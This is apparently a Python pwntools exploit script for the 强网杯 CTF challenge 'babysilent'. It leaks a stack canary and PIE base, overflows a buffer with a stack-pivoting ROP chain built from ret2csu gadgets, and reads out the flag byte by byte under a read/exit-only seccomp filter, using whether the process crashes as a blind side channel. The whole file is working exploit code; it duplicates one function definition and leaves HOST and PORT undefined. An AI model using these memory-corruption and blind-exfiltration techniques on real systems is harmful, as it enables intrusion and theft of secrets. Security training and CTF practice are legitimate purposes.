#!/usr/bin/env python3
# 强网杯 babysilent - seccomp(read/exit) 下无输出的时序侧信道盲注
# 用法: python3 exp.py            (remote)
#       python3 exp.py local      (./pwn_local 本地验证, 需同目录 flag)
from pwn import *
import time,select,struct
context.log_level='error'
PIE_LEAK_OFF=0x2005a0
CSUpop=0x2005fa; CSUcall=0x2005e0; POPRDI=0x200603; CMPG=0x20038b; POPSP=0x2005fd
READGOT=0x600fa8; EXITPLT=0x2000f0; GETNUM=0x2003aa
BSS=0x601028; CHAIN_OFF=0x601c00; NEWRSP_OFF=CHAIN_OFF-0x18
DEST_OFF=0x601e00; NUM_OFF=DEST_OFF+0x40; PAYLEN=NUM_OFF+0x8-BSS

def connect(host=None,port=None,bin=None):
    if host: return remote(host,port,timeout=6)
    return process(bin or './pwn_local')

def leak(p,tout=5):
    p.recvuntil(b'size: ',timeout=tout); p.send(b'136\n')
    p.recvuntil(b'> ',timeout=tout); p.send(b'A'*0x58+b'B'+b'\n')
    d=p.recvuntil(b'Now you have',timeout=tout)
    line=d.split(b'\n')[0]
    if not line.startswith(b'Your name is: '): return None
    lk=line[len(b'Your name is: '):]
    if len(lk)<0x60 or lk[0x58:0x59]!=b'B': return None
    canary=b'\x00'+lk[0x59:0x60]
    rb=lk[0x60:]
    if len(rb)>6: return None
    pie=u64(rb.ljust(8,b'\x00'))-PIE_LEAK_OFF
    if pie<=0 or pie&0x1fffff: return None
    if b'\x0a' in canary: return None
    return canary,pie

def _nz(v): return 0x0a not in p64(v)

def split_counts(n):
    if n<=0: return (0,0)
    if n==1: return (1,0)
    for c1 in range(1,n):
        c2=n-c1
        if _nz(c1) and _nz(c2): return (c1,c2)
    return None

def build(canary,pie,i,T):
    P=pie+BSS; CHAIN=pie+CHAIN_OFF; NEWRSP=pie+NEWRSP_OFF; DEST=pie+DEST_OFF
    n=i+1
    sc=split_counts(n)
    if sc is None: return None
    c1,c2=sc
    s1=b'A'*0x58+canary+p64(pie+0x601088)+p64(pie+0x200515)
    payload=bytearray(PAYLEN)
    payload[0x58:0x60]=canary
    payload[0x60:0x68]=p64(DEST+0x100)
    payload[0x68:0x70]=p64(pie+POPSP)
    payload[0x70:0x78]=p64(NEWRSP)
    chain=[pie+CSUpop,0,1,pie+READGOT,3,DEST-i,c1,pie+CSUcall,
           0,0,0,0,0,0,0]
    if c2:
        chain += [pie+CSUpop,0,1,pie+READGOT,3,DEST-i+c1,c2,pie+CSUcall,
                  0,0,DEST+0x1c,0,0,0,0]
    else:
        chain += [pie+CSUpop,0,1,pie+READGOT,3,DEST,c2,pie+CSUcall,
                  0,0,DEST+0x1c,0,0,0,0]
    chain += [pie+GETNUM,pie+CMPG]
    off=CHAIN-P
    for q in chain:
        payload[off:off+8]=p64(q); off+=8
    d0=DEST-P
    payload[d0:d0+0x18]=p32(0)+p64(DEST+0x100)+b'\x00'*0xc
    payload[d0+0x14:d0+0x1c]=canary
    payload[d0+0x1c:d0+0x24]=b'D'*8
    payload[d0+0x24:d0+0x2c]=p64(pie+EXITPLT)
    if b'\x0a' in s1 or b'\x0a' in payload: return None
    return s1,bytes(payload)

def run_attempt(p,i,T,remote_mode=False,pre=1.4,pokes=6,gap=0.12):
    r=leak(p)
    if r is None: return 'retry'
    b=build(r[0],r[1],i,T)
    if b is None: return 'retry'
    s1,payload=b
    p.send(s1+b'\n'); time.sleep(0.12)
    p.send(payload+b'\n'); time.sleep(0.08)
    p.send(b'\n'); time.sleep(0.08)
    p.send(str(T).encode()+b'\n')
    time.sleep(pre)
    if remote_mode:
        try:
            while True:
                rd,_,_=select.select([p.sock],[],[],0.01)
                if not rd: break
                if p.sock.recv(65536)==b'': return 'dead'
        except Exception: return 'retry'
        for _ in range(pokes):
            try: p.send(b'X')
            except Exception: return 'dead'
            time.sleep(gap)
            try:
                rd,_,_=select.select([p.sock],[],[],0.01)
                if rd:
                    if p.sock.recv(65536)==b'': return 'dead'
            except Exception: return 'dead'
        return 'alive'
    st=p.poll()
    if st is None:
        p.send(b'X'); time.sleep(0.2); st=p.poll()
        if st is None: return 'alive'
    if st is not None and st<0: return 'invalid'
    return 'dead'

def attempt(i,T,host=None,port=None,bin=None,tries=8,remote_mode=False,pre=1.4):
    for _ in range(tries):
        try: p=connect(host,port,bin)
        except Exception: continue
        try: r=run_attempt(p,i,T,remote_mode=remote_mode,pre=pre)
        except Exception: r='retry'
        try: p.close()
        except Exception: pass
        if r!='retry': return r
    return 'retry'

def guess_byte(i,lo=0x20,hi=0x7f,host=None,port=None,bin=None,remote_mode=False,confirm=True,pre=1.4):
    while lo<hi:
        mid=(lo+hi)//2
        a=attempt(i,mid,host,port,bin,remote_mode=remote_mode,pre=pre)
        if a=='retry': return None
        if a=='alive': lo=mid+1
        elif a=='dead': hi=mid
        else: return None
    v=lo
    if confirm:
        a=attempt(i,v-1,host,port,bin,remote_mode=remote_mode,pre=pre)
        if a!='alive': return None
        b=attempt(i,v,host,port,bin,remote_mode=remote_mode,pre=pre)
        if b!='dead': return None
    return v


def solve(local=None, host=None, port=None, start=0, prefix=b''):
    out=bytearray(prefix)
    for i in range(start, 80):
        v=None
        for _ in range(6):
            if sanity_alive(i, local, host, port):
                v=guess_byte(i, local=local, host=host, port=port)
                if v is not None: break
            time.sleep(0.5)
        if v is None:
            print('[*] stop at index %d, result: %r' % (i, bytes(out)), flush=True)
            return bytes(out)
        out.append(v)
        print('[+] byte[%d]=%r  ->  %r' % (i, chr(v) if 32<=v<127 else v, bytes(out)), flush=True)
        if v==ord('}'): break
    print('[+] FLAG =', bytes(out).decode(), flush=True)
    return bytes(out)

def solid_attempt(i,T,local,host,port,tries=10):
    for _ in range(tries):
        r=attempt(i,T,host=host,port=port,bin=local,
                  remote_mode=(host is not None),tries=4)
        if r!='retry': return r
    return 'retry'

def sanity_alive(i,local,host,port):
    return solid_attempt(i,0x1f,local,host,port)=='alive'

def guess_byte(i,local=None,host=None,port=None):
    lo,hi=0x20,0x7f
    while lo<hi:
        mid=(lo+hi)//2
        a=solid_attempt(i,mid,local,host,port)
        if a=='retry': return None
        if a=='alive': lo=mid+1
        elif a=='dead': hi=mid
        else: return None
    v=lo
    if solid_attempt(i,v-1,local,host,port)!='alive': return None
    if solid_attempt(i,v,local,host,port)!='dead': return None
    return v

if __name__ == '__main__':
    import sys
    if len(sys.argv)>1 and sys.argv[1]=='local':
        solve(local='./pwn_local')
    else:
        solve(host=HOST, port=PORT)
